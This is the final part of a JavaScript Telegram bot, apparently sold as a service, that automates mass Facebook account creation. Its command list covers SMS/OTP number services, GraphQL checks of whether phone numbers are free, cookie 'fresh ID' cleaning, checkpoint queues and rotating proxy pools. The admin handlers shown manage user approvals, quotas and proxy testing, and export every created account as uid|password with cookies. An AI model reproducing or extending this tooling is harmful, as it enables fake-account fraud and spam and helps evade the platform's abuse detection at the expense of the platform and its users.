        promptSessions.delete(uid);
        await renderAdminHome(chatId, msgId);
        return;
      }
      if (data === 'admin:users' || data.startsWith('admin:users:')) {
        promptSessions.delete(uid);
        const f = data.startsWith('admin:users:') ? data.slice('admin:users:'.length) : 'all';
        const filter = ['approved', 'pending', 'blocked'].includes(f) ? f : 'all';
        await renderAdminUsersList(chatId, filter, msgId);
        return;
      }
      if (data === 'admin:ufind') {
        promptSessions.set(uid, { kind: 'admin_awaiting_find_user' });
        await sendMessage(chatId, `🔍 <b>FIND USER</b>\nEnter Telegram User ID, <code>@username</code>, or name:`, {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:users')]],
        });
        return;
      }
      if (data === 'admin:approve_all_pending') {
        const map = readUsersMap();
        let cnt = 0;
        for (const u of Object.values(map)) {
          if (u.status === 'pending') {
            u.status = 'approved';
            cnt += 1;
            await sendMessage(u.id, `✅ <b>Your ${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} access has been approved!</b>`, {
              inline_keyboard: [[btnOk('🚀 Open Tool Menu', 'menu:home')]],
            });
          }
        }
        writeUsersMap(map);
        pushBotLog(`Admin bulk-approved ${cnt} pending users`);
        await sendMessage(chatId, `✅ Approved <code>${cnt}</code> pending users.`);
        await renderAdminUsersList(chatId, 'all');
        return;
      }
      if (data === 'admin:reset_all_quotas') {
        const map = readUsersMap();
        let cnt = 0;
        for (const u of Object.values(map)) {
          if (u.usedToday > 0) {
            u.usedToday = 0;
            cnt += 1;
          }
        }
        writeUsersMap(map);
        pushBotLog(`Admin reset today quotas for ${cnt} users`);
        await sendMessage(chatId, `🔄 Reset today's quota usage for <code>${cnt}</code> users.`);
        await renderAdminUsersList(chatId, 'all');
        return;
      }
      if (data === 'admin:brand') {
        promptSessions.delete(uid);
        await renderAdminBrandMenu(chatId, msgId);
        return;
      }
      if (data === 'admin:set_brand') {
        promptSessions.set(uid, { kind: 'admin_awaiting_brand' });
        await sendMessage(chatId, `🏷 <b>EDIT BRAND NAME</b>\nSend the new Brand Name (current: <code>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)}</code>):`, {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:brand')]],
        });
        return;
      }
      if (data === 'admin:set_owner') {
        promptSessions.set(uid, { kind: 'admin_awaiting_owner' });
        await sendMessage(chatId, `👑 <b>EDIT OWNER / ADMIN LINK</b>\nSend username or link (e.g. <code>@CODINGJAMES_X</code> or <code>https://t.me/CODINGJAMES_X</code>):`, {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:brand')]],
        });
        return;
      }
      if (data === 'admin:set_channel') {
        promptSessions.set(uid, { kind: 'admin_awaiting_channel' });
        await sendMessage(chatId, `📢 <b>EDIT OFFICIAL CHANNEL URL</b>\nSend channel link or handle (e.g. <code>https://t.me/EarnAirdropX</code>):`, {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:brand')]],
        });
        return;
      }
      if (data === 'admin:test_channel') {
        const handle = getChannelHandle(st.channelUrl);
        const res = await tgCall('getChat', { chat_id: handle });
        const me = botInfo?.id ? await tgCall('getChatMember', { chat_id: handle, user_id: botInfo.id }) : null;
        const botStatus = me?.ok ? me.result?.status : 'not admin / unreachable';
        await sendMessage(
          chatId,
          [
            `🧪 <b>CHANNEL BOT CHECK</b>`,
            DIVIDER,
            `📢 <b>Target:</b> <code>${escapeHtml(handle)}</code>`,
            `🔎 <b>Channel Lookup:</b> ${res.ok ? `🟢 ${escapeHtml(res.result?.title || handle)}` : `🔴 ${escapeHtml(res.description || 'Not found')}`}`,
            `🤖 <b>Bot Role in Channel:</b> <code>${escapeHtml(String(botStatus))}</code>`,
            ``,
            `<i>For Force Join verification to work, make @${escapeHtml(botInfo?.username || 'bot')} an Admin in ${escapeHtml(handle)}.</i>`,
          ].join('\n'),
          { inline_keyboard: [[btnNav('⬅️ Brand & Channel', 'admin:brand')]] }
        );
        return;
      }
      if (data === 'admin:settings') {
        promptSessions.delete(uid);
        await renderAdminSettings(chatId, msgId);
        return;
      }
      if (data === 'admin:toggle_approval') {
        writeSettings({ requireApproval: !readSettings().requireApproval });
        await renderAdminSettings(chatId, msgId);
        return;
      }
      if (data === 'admin:toggle_sharepx') {
        writeSettings({ shareGlobalProxies: !readSettings().shareGlobalProxies });
        await renderAdminSettings(chatId, msgId);
        return;
      }
      if (data === 'admin:toggle_maint') {
        const next = !readSettings().maintenanceMode;
        writeSettings({ maintenanceMode: next });
        pushBotLog(`Admin toggled maintenance mode -> ${next ? 'ON' : 'OFF'}`);
        await renderAdminHome(chatId, msgId);
        return;
      }
      if (data === 'admin:toggle_forcejoin') {
        const next = !readSettings().requireChannelJoin;
        writeSettings({ requireChannelJoin: next });
        pushBotLog(`Admin toggled channel force join -> ${next ? 'ON' : 'OFF'}`);
        await renderAdminBrandMenu(chatId, msgId);
        return;
      }
      if (data === 'admin:cycle_def_engine') {
        const order = ['hybrid', 'limited', 'classic'];
        const cur = order.indexOf(readSettings().defaultEngineMode || 'hybrid');
        const next = order[(cur + 1) % order.length];
        writeSettings({ defaultEngineMode: next });
        await renderAdminSettings(chatId, msgId);
        return;
      }
      if (data === 'admin:toggle_def_gql') {
        writeSettings({ defaultPrecheckGql: readSettings().defaultPrecheckGql === false });
        await renderAdminSettings(chatId, msgId);
        return;
      }
      if (data === 'admin:sync_defaults') {
        const stNow = readSettings();
        const users = Object.values(readUsersMap());
        for (const u of users) {
          writeUserConfig(u.id, {
            engine_mode: stNow.defaultEngineMode || 'hybrid',
            precheck_gql: stNow.defaultPrecheckGql !== false,
          });
        }
        await sendMessage(
          chatId,
          `♻️ Synced Engine (<code>${escapeHtml((stNow.defaultEngineMode || 'hybrid').toUpperCase())}</code>) & GQL Check (${stNow.defaultPrecheckGql !== false ? 'ON' : 'OFF'}) to <code>${users.length}</code> users.`,
          { inline_keyboard: [[btnNav('⚙️ Back to Policy', 'admin:settings')]] }
        );
        return;
      }
      if (data === 'admin:set_default_limit') {
        promptSessions.set(uid, { kind: 'admin_awaiting_default_limit' });
        await sendMessage(chatId, '🎯 <b>SET DEFAULT QUOTA</b>\nEnter new default daily quota limit for users (e.g. <code>25</code> or <code>100</code>):', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:settings')]],
        });
        return;
      }
      if (data === 'admin:set_voltx_key') {
        promptSessions.set(uid, { kind: 'admin_awaiting_voltx_key' });
        await sendMessage(chatId, '🔑 <b>SET DEFAULT VOLTX API KEY</b>\nPaste the shared Voltx <code>mauthapi</code> key for approved users (or <code>-</code> to clear):', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:settings')]],
        });
        return;
      }
      if (data === 'admin:set_welcome') {
        promptSessions.set(uid, { kind: 'admin_awaiting_welcome' });
        await sendMessage(chatId, '💬 <b>EDIT WELCOME NOTE</b>\nEnter new welcome message note shown to all users:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:brand')]],
        });
        return;
      }
      if (data === 'admin:broadcast') {
        promptSessions.set(uid, { kind: 'admin_awaiting_broadcast' });
        await sendMessage(chatId, '📣 <b>BROADCAST ANNOUNCEMENT</b>\nSend the announcement message to broadcast to all approved users:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:home')]],
        });
        return;
      }
      if (data === 'admin:proxies') {
        promptSessions.delete(uid);
        await renderAdminGlobalProxies(chatId, msgId);
        return;
      }
      if (data === 'admin:px_add') {
        promptSessions.set(uid, { kind: 'admin_awaiting_global_proxies' });
        await sendMessage(
          chatId,
          `🌐 <b>ADD GLOBAL PROXIES</b>\nSend global proxies (one per line, 9Proxy <code>user:pass:host:port</code>, <code>host:port:user:pass</code>, or <code>http://user:pass@ip:port</code>):`,
          { inline_keyboard: [[btnBad('❌ Cancel', 'admin:proxies')]] }
        );
        return;
      }
      if (data === 'admin:px_test') {
        const list = readGlobalProxies();
        if (list.length === 0) {
          await sendMessage(chatId, 'Global proxy pool is empty.', {
            inline_keyboard: [[btnNav('⬅️ Global Proxies', 'admin:proxies')]],
          });
          return;
        }
        const batchSlice = list.slice(0, 20);
        await sendMessage(chatId, `🧪 Testing <code>${batchSlice.length}</code> global proxies concurrently (15x)...`);
        const results = new Array(batchSlice.length);
        let pIdx = 0;
        await Promise.all(
          Array.from({ length: Math.min(15, batchSlice.length) }, async () => {
            while (true) {
              const idx = pIdx++;
              if (idx >= batchSlice.length) break;
              results[idx] = await testProxyTcp(batchSlice[idx], true);
            }
          })
        );
        const liveCnt = results.filter((r) => r.ok).length;
        const lines = results.map((r, i) => {
          const meta = r.ok
            ? `${r.latencyMs}ms${r.exitIp ? ` • IP ${escapeHtml(r.exitIp)}` : ''}${r.hasLsd ? ' • LSD OK' : ''}`
            : `${r.latencyMs}ms${r.error ? ` • ${escapeHtml(r.error)}` : ''}`;
          return `${i + 1}. ${r.ok ? '✅ LIVE' : '❌ DEAD'} (<code>${meta}</code>)\n    <code>${escapeHtml(r.proxy)}</code>`;
        });
        await sendMessage(
          chatId,
          `🧪 <b>GLOBAL PROXY RESULTS (${liveCnt}/${results.length} LIVE)</b>\n${DIVIDER}\n${lines.join('\n')}`,
          {
            inline_keyboard: [
              [
                btnOk('⚡ Sort by Speed', 'admin:px_sort'),
                btnBad('🧹 Prune Dead', 'admin:px_prune'),
              ],
              [btnNav('⬅️ Global Proxies', 'admin:proxies')],
            ],
          }
        );
        return;
      }
      if (data === 'admin:px_sort') {
        const list = readGlobalProxies();
        if (list.length === 0) {
          await sendMessage(chatId, 'Global proxy pool is empty.', {
            inline_keyboard: [[btnNav('⬅️ Global Proxies', 'admin:proxies')]],
          });
          return;
        }
        await sendMessage(chatId, `⚡ Benchmarking <code>${list.length}</code> global proxies concurrently (15x)...`);
        const results = new Array(list.length);
        let pIdx = 0;
        await Promise.all(
          Array.from({ length: Math.min(15, list.length) }, async () => {
            while (true) {
              const idx = pIdx++;
              if (idx >= list.length) break;
              results[idx] = await testProxyTcp(list[idx], true);
            }
          })
        );
        results.sort((a, b) => {
          if (a.ok !== b.ok) return a.ok ? -1 : 1;
          return a.latencyMs - b.latencyMs;
        });
        writeGlobalProxies(results.map((r) => r.proxy));
        await sendMessage(chatId, `⚡ Sorted <code>${results.length}</code> global proxies (fastest live first).`);
        await renderAdminGlobalProxies(chatId);
        return;
      }
      if (data === 'admin:px_prune') {
        const list = readGlobalProxies();
        if (list.length === 0) {
          await sendMessage(chatId, 'Global proxy pool is empty.', {
            inline_keyboard: [[btnOk('➕ Add Global Proxies', 'admin:px_add'), btnNav('⬅️ Global Proxies', 'admin:proxies')]],
          });
          return;
        }
        const results = new Array(list.length);
        let pIdx = 0;
        await Promise.all(
          Array.from({ length: Math.min(15, list.length) }, async () => {
            while (true) {
              const idx = pIdx++;
              if (idx >= list.length) break;
              results[idx] = await testProxyTcp(list[idx], false);
            }
          })
        );
        const live = results.filter((r) => r.ok).sort((a, b) => a.latencyMs - b.latencyMs).map((r) => r.proxy);
        writeGlobalProxies(live);
        await sendMessage(chatId, `✅ Pruned <code>${list.length - live.length}</code> dead global proxies. Remaining: <code>${live.length}</code>.`);
        await renderAdminGlobalProxies(chatId);
        return;
      }
      if (data === 'admin:px_clear') {
        writeGlobalProxies([]);
        await renderAdminGlobalProxies(chatId, msgId);
        return;
      }
      if (data === 'admin:live') {
        promptSessions.delete(uid);
        await renderAdminLiveRuns(chatId, msgId);
        return;
      }
      if (data === 'admin:stop_all') {
        let stopped = 0;
        for (const [, r] of activeRuns.entries()) {
          if (r.running) {
            r.abortRequested = true;
            stopped += 1;
          }
        }
        pushBotLog(`Admin emergency-stopped ${stopped} active runs`);
        await sendMessage(chatId, `🛑 Sent stop signal to <code>${stopped}</code> active batch runs.`);
        await renderAdminLiveRuns(chatId);
        return;
      }
      if (data === 'admin:analytics' || data === 'admin:sysinfo') {
        promptSessions.delete(uid);
        await renderAdminAnalytics(chatId, msgId);
        return;
      }
      if (data === 'admin:backup') {
        promptSessions.delete(uid);
        await renderAdminBackupMenu(chatId, msgId);
        return;
      }
      if (data === 'admin:dl_all_ready') {
        const users = Object.values(readUsersMap());
        const seen = new Set();
        const lines = [];
        for (const u of users) {
          for (const a of readUserAccounts(u.id)) {
            if (a.status === 'OK' && a.uid && !seen.has(a.uid)) {
              seen.add(a.uid);
              lines.push(`${a.uid}|${a.password}`);
            }
          }
        }
        await sendDocumentText(chatId, `JEME_ALL_READY_${Date.now()}.txt`, lines.join('\n') || 'No ready accounts yet.', `All Ready UID|Pass (${lines.length})`);
        return;
      }
      if (data === 'admin:dl_all_csv') {
        const users = Object.values(readUsersMap());
        const header = ['user_id', 'timestamp', 'name', 'number', 'password', 'uid', 'status', 'engine', 'cookie'].join(',');
        const rows = [];
        for (const u of users) {
          for (const a of readUserAccounts(u.id)) {
            rows.push([u.id, a.ts, a.name, a.number, a.password, a.uid, a.status, a.engine || '', formatCookieHeader(a.cookies || {})].map(csvCell).join(','));
          }
        }
        await sendDocumentText(chatId, `JEME_ALL_ACCOUNTS_${Date.now()}.csv`, [header, ...rows].join('\n'), `Global Accounts Export (${rows.length})`);
        return;
      }
      if (data === 'admin:dl_users') {
        const raw = fs.existsSync(FILES.botUsers) ? fs.readFileSync(FILES.botUsers, 'utf-8') : '{}';
        await sendDocumentText(chatId, `JEME_USERS_DB_${Date.now()}.json`, raw, 'Users Database Backup');
        return;
      }
      if (data === 'admin:dl_proxies') {
        const raw = fs.existsSync(FILES.proxies) ? fs.readFileSync(FILES.proxies, 'utf-8') : 'No global proxies';
        await sendDocumentText(chatId, `JEME_GLOBAL_PROXIES_${Date.now()}.txt`, raw, 'Global Proxies Backup');
        return;
      }
      if (data === 'admin:dl_syslog') {
        const raw = fs.existsSync(FILES.debugLog) ? fs.readFileSync(FILES.debugLog, 'utf-8') : 'No system logs';
        await sendDocumentText(chatId, `JEME_SYSTEM_DEBUG_${Date.now()}.log`, raw, 'System Debug Log');
        return;
      }
      if (data === 'admin:logs') {
        promptSessions.delete(uid);
        await renderAdminLogsMenu(chatId, msgId);
        return;
      }
      if (data === 'admin:clear_logs') {
        try { fs.writeFileSync(FILES.debugLog, '', 'utf-8'); } catch { /* ignore */ }
        logs.length = 0;
        await renderAdminLogsMenu(chatId, msgId);
        return;
      }

      const parts = data.split(':');
      if (parts.length === 3 && parts[1] === 'uview') {
        promptSessions.delete(uid);
        await renderAdminUserDetail(chatId, parts[2], msgId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'udm') {
        const targetId = parts[2];
        promptSessions.set(uid, { kind: 'admin_awaiting_dm', targetUserId: targetId });
        await sendMessage(chatId, `📩 <b>DIRECT MESSAGE TO USER</b>\nEnter the message to send to <code>${escapeHtml(targetId)}</code>:`, {
          inline_keyboard: [[btnBad('❌ Cancel', `admin:uview:${targetId}`)]],
        });
        return;
      }
      if (parts.length === 3 && parts[1] === 'uexport') {
        const targetId = parts[2];
        const okLines = readUserAccounts(targetId)
          .filter((a) => a.status === 'OK' && a.uid)
          .map((a) => `${a.uid}|${a.password}`);
        await sendDocumentText(chatId, `USER_${targetId}_READY.txt`, okLines.join('\n') || 'No ready accounts yet.', `User ${targetId} Ready Accounts (${okLines.length})`);
        return;
      }
      if (parts.length === 3 && parts[1] === 'uclear_done') {
        const targetId = parts[2];
        clearUserDone(targetId);
        writeUserPending(targetId, []);
        await sendMessage(chatId, `🧹 Cleared done history and OTP queue for user <code>${escapeHtml(targetId)}</code>.`);
        await renderAdminUserDetail(chatId, targetId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'urole') {
        const targetId = parts[2];
        if (targetId === DEFAULT_ADMIN_ID) {
          await sendMessage(chatId, '⛔ Primary owner role cannot be modified.');
          return;
        }
        const map = readUsersMap();
        if (map[targetId]) {
          map[targetId].role = map[targetId].role === 'admin' ? 'user' : 'admin';
          if (map[targetId].role === 'admin') map[targetId].status = 'approved';
          writeUsersMap(map);
          pushBotLog(`Admin changed role of ${targetId} -> ${map[targetId].role}`);
        }
        await renderAdminUserDetail(chatId, targetId, msgId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'uapprove') {
        const targetId = parts[2];
        const map = readUsersMap();
        if (targetId && map[targetId]) {
          map[targetId].status = 'approved';
          writeUsersMap(map);
          await sendMessage(targetId, `✅ <b>Your ${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} bot access is active!</b>\nTap below to open your tools:`, {
            inline_keyboard: [[btnOk('🚀 Open Tool Menu', 'menu:home')]],
          });
        }
        await renderAdminUserDetail(chatId, targetId, msgId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'ublock') {
        const targetId = parts[2];
        if (targetId === DEFAULT_ADMIN_ID) {
          await sendMessage(chatId, '⛔ Primary owner cannot be blocked.');
          return;
        }
        const map = readUsersMap();
        if (targetId && map[targetId]) {
          map[targetId].status = 'blocked';
          writeUsersMap(map);
          await sendMessage(targetId, `🚫 Your bot access has been blocked by admin.`);
        }
        await renderAdminUserDetail(chatId, targetId, msgId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'ulimit') {
        const targetId = parts[2];
        promptSessions.set(uid, { kind: 'admin_awaiting_user_limit', targetUserId: targetId });
        await sendMessage(chatId, `🎯 <b>SET USER DAILY LIMIT</b>\nEnter new daily limit for user <code>${escapeHtml(targetId)}</code>:`, {
          inline_keyboard: [[btnBad('❌ Cancel', `admin:uview:${targetId}`)]],
        });
        return;
      }
      if (parts.length === 3 && parts[1] === 'ureset') {
        const targetId = parts[2];
        const map = readUsersMap();
        if (map[targetId]) {
          map[targetId].usedToday = 0;
          writeUsersMap(map);
        }
        await renderAdminUserDetail(chatId, targetId, msgId);
        return;
      }
      if (parts.length === 3 && parts[1] === 'stopuser') {
        const targetId = parts[2];
        const run = activeRuns.get(targetId);
        if (run && run.running) {
          run.abortRequested = true;
          pushBotLog(`Admin stopped active run for user ${targetId}`);
        }
        await renderAdminHome(chatId, msgId);
        return;
      }
      if (parts.length === 3 && (parts[1] === 'approve' || parts[1] === 'block')) {
        const targetId = parts[2];
        const map = readUsersMap();
        if (targetId && map[targetId]) {
          map[targetId].status = parts[1] === 'approve' ? 'approved' : 'blocked';
          writeUsersMap(map);
          pushBotLog(`Admin ${parts[1]}d Telegram user ${targetId}`);
          await sendMessage(
            targetId,
            parts[1] === 'approve'
              ? `✅ <b>Your ${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} bot access has been approved!</b>\nTap below to open all tools directly inside Telegram:`
              : `🚫 Your bot access request was declined.`,
            parts[1] === 'approve' ? { inline_keyboard: [[btnOk('🚀 Open Tool Menu', 'menu:home')]] } : undefined
          );
        }
        await renderAdminHome(chatId, msgId);
      }
    }
  }

  async function pollLoop() {
    while (running) {
      pollAbort = new AbortController();
      const res = await tgCall('getUpdates', { offset, timeout: 25, allowed_updates: ['message', 'callback_query'] }, pollAbort.signal);
      if (!running) break;

      if (!res.ok) {
        lastError = res.description || 'Polling error';
        connected = false;
        let waitMs = 2000;
        const lowErr = lastError.toLowerCase();
        if (res.error_code === 429) {
          const retryAfter = Number(res.parameters?.retry_after || 20);
          waitMs = Math.min(35000, Math.max(5000, (retryAfter + 1) * 1000));
        } else if (lowErr.includes('webhook')) {
          await tgCall('deleteWebhook', { drop_pending_updates: false }, undefined, { noRetry: true }).catch(() => {});
          waitMs = 1500;
        } else if (lowErr.includes('conflict')) {
          waitMs = 4000;
        }
        await new Promise((r) => setTimeout(r, waitMs));
        continue;
      }

      connected = true;
      lastError = '';
      const updates = Array.isArray(res.result) ? res.result : [];
      for (const upd of updates) {
        offset = upd.update_id + 1;
        const task = upd.message
          ? processMessage(upd.message)
          : upd.callback_query
          ? processCallback(upd.callback_query)
          : Promise.resolve();
        Promise.resolve(task).catch((err) => {
          pushBotLog(`Update error: ${err instanceof Error ? err.message : 'unknown'}`);
        });
      }
    }
  }

  async function start() {
    let me = null;
    for (let attempt = 1; ; attempt++) {
      me = await tgCall('getMe');
      if (me.ok && me.result) break;
      const errCode = Number(me?.error_code || 0);
      if (errCode === 401 || errCode === 404) {
        throw new Error(me?.description || `Invalid bot token (${errCode})`);
      }
      const waitMs = errCode === 429
        ? Math.min(35000, Math.max(5000, (Number(me?.parameters?.retry_after || 15) + 1) * 1000))
        : 3000;
      pushBotLog(`[WARN] getMe attempt ${attempt} failed: ${me?.description || 'unknown'}. Retrying in ${Math.round(waitMs / 1000)}s...`);
      await new Promise((r) => setTimeout(r, waitMs));
    }

    botInfo = { id: me.result.id, username: me.result.username || '', firstName: me.result.first_name || 'Bot' };
    running = true;
    connected = true;
    lastError = '';
    startedAt = Date.now();
    pushBotLog(`Standalone bot online as @${botInfo.username} (Admin ID: ${readSettings().adminId}, Data: ${DATA_ROOT})`);

    setTimeout(() => {
      if (!running) return;
      tgCall('setMyCommands', {
        commands: [
          { command: 'start', description: 'Open main control dashboard' },
          { command: 'pcclone', description: 'PC Clone (Auto Country, 1-10x OTP + Lamix)' },
          { command: 'voltx', description: 'Voltx SMS Range & Auto-OTP FB Creator' },
          { command: 'run', description: 'Start a batch account run' },
          { command: 'check', description: 'Check numbers FREE/TAKEN via GraphQL' },
          { command: 'otp', description: 'Open OTP & checkpoint queue' },
          { command: 'accounts', description: 'View & export ready accounts' },
          { command: 'proxies', description: 'Manage, test & sort proxy pool' },
          { command: 'settings', description: 'Configure engine & proxy settings' },
          { command: 'cookies', description: 'Manage cookies & fresh ID cleaner' },
          { command: 'fresh', description: '1-Click clear cookies & caches' },
          { command: 'logs', description: 'View recent debug logs' },
          { command: 'diag', description: 'Run live Limited FB & proxy diagnostics' },
          { command: 'help', description: 'Command & workflow guide' },
          { command: 'cancel', description: 'Cancel active prompt input' },
        ],
      }, undefined, { noRetry: true }).catch(() => {});
    }, 5000);

    pollLoop().catch((err) => {
      lastError = err instanceof Error ? err.message : 'Loop stopped';
      running = false;
      connected = false;
      pushBotLog(`Polling terminated: ${lastError}`);
    });
  }

  function stop() {
    running = false;
    connected = false;
    if (pollAbort) {
      pollAbort.abort();
      pollAbort = null;
    }
    pushBotLog('Bot stopped cleanly.');
  }

  function statusSummary() {
    return {
      ok: running && connected,
      running,
      connected,
      bot: botInfo ? `@${botInfo.username}` : null,
      uptimeSec: startedAt ? Math.floor((Date.now() - startedAt) / 1000) : 0,
      lastError: lastError || undefined,
    };
  }

  return { start, stop, statusSummary };
}

// ----------------------------------------------------------------------------
// 7. Entrypoint (Env / CLI / Interactive Prompt + Optional Health HTTP)
// ----------------------------------------------------------------------------
async function resolveToken() {
  const direct = (CLI.token || process.env.TELEGRAM_BOT_TOKEN || '').trim();
  if (direct) return direct;

  if (!process.stdin.isTTY) {
    console.error('[FbTools] ERROR: TELEGRAM_BOT_TOKEN is missing.');
    console.error('Set environment variable or pass --token=YOUR_BOT_TOKEN');
    process.exit(1);
  }

  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  const ask = (q) => new Promise((res) => rl.question(q, res));
  const token = (await ask('Enter TELEGRAM_BOT_TOKEN: ')).trim();
  rl.close();
  if (!token) {
    console.error('Bot token is required.');
    process.exit(1);
  }
  return token;
}

async function main() {
  const curlStatus = await checkCurlAvailable();
  if (!curlStatus.ok) {
    console.warn('[fbtoolbot] WARNING: `curl` binary not found. Direct fetch still works, but proxy support requires curl.');
  }

  if (CLI.diag) {
    console.log('[fbtoolbot] Runtime Environment Check:');
    console.log('  Node.js  :', process.version, `(${process.platform}/${process.arch})`);
    console.log('  curl     :', curlStatus.ok ? `OK (${curlStatus.version})` : 'MISSING');
    console.log('  Data Dir :', DATA_ROOT);
    const diag = await runDiagnoseFor({ ...DEFAULT_CONFIG }, normalizeBaseCookiesRaw(''), null);
    console.log('  FB Probe :', diag.tokenOk ? `TOKEN OK (${diag.src})` : 'NO TOKEN');
    console.log('  FB GQL   :', diag.gqlOk ? `OK (${diag.gqlInfo})` : `ERR (${diag.gqlInfo})`);
    console.log('  PX Bytes :', formatBytes(proxyTrafficStats.txBytes + proxyTrafficStats.rxBytes));
    console.log('  Trace    :', diag.trace.join(' | '));
    process.exit(diag.tokenOk ? 0 : 1);
  }

  const token = await resolveToken();
  const bot = createStandaloneBot(token);

  const portVal = Number(CLI.port || process.env.PORT || 0);
  let server = null;
  if (Number.isInteger(portVal) && portVal > 0 && portVal <= 65535) {
    server = http.createServer((_req, res) => {
      res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
      res.end(JSON.stringify(bot.statusSummary()));
    });
    server.on('error', (err) => {
      console.warn(`[fbtoolbot] Health HTTP server disabled (${err.code || err.message})`);
      appendDebugLog(`[WARN] Health HTTP server error: ${err.code || err.message}`);
    });
    server.listen(portVal, '0.0.0.0', () => {
      console.log(`[fbtoolbot] Health HTTP server listening on 0.0.0.0:${portVal}`);
    });
  }

  await bot.start();

  const shutdown = () => {
    bot.stop();
    if (server) server.close();
    process.exit(0);
  };
  process.on('SIGINT', shutdown);
  process.on('SIGTERM', shutdown);
  process.on('unhandledRejection', (err) => {
    appendDebugLog(`[WARN] UnhandledRejection: ${err instanceof Error ? err.message : String(err)}`);
  });
}

await main();
})().catch((err) => {
  console.error('[fbtoolbot] Fatal error:', err instanceof Error ? err.message : err);
  process.exit(1);
});
